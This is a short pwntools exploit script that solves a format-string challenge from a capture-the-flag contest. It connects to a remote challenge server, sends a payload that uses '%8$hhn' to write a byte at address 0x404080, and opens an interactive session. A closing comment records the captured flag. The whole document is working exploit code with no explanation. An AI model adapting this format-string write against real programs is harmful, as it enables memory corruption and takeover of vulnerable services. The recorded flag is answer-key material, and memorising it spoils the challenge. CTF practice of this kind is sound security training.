from pwn import *


elf = ELF('./format')
p = remote('challenges.ctfd.io', 30266)
p.recvuntil('.\n')
p.sendline("%60x      %8$hhn{}".format(p64(0x404080)))
p.interactive()

#FLAG --> nactf{d0nt_pr1ntf_u54r_1nput_HoUaRUxuGq2lVSHM}
